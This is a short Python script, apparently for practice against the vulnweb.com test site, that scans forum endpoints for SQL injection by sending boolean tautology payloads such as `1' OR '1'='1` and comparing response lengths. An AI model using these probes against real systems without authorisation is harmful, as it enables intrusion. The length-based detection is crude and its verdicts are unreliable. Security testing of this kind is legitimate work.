import asyncio
import httpx

async def test_sqli(client, url, param):
    r1 = await client.get(url)
    orig_len = len(r1.text)
    
    tests = [
        f"{param}=1' AND '1'='1",
        f"{param}=1 AND 1=1",
        f"{param}=1' OR '1'='1",
    ]
    
    for test in tests:
        r2 = await client.get(f"{url}&{test}")
        if len(r2.text) != orig_len:
            return True
    return False

async def scan():
    base_url = 'http://testasp.vulnweb.com'
    
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.get(base_url)
        
        endpoints = [
            "showthread.asp?id=2",
            "showthread.asp?id=1",
            "showforum.asp?id=1",
            "showforum.asp?id=2", 
            "showforum.asp?id=0",
            "showforum.asp",
        ]
        
        print("Testing additional endpoints...")
        
        for ep in endpoints:
            url = f"{base_url}/{ep}"
            parsed = urlparse(ep)
            if '?' in ep:
                param = ep.split('?')[1].split('=')[0]
            else:
                continue
            
            is_vuln = await test_sqli(client, url, param)
            if is_vuln:
                print(f"[VULN] {url}")

if __name__ == "__main__":
    from urllib.parse import urlparse
    asyncio.run(scan())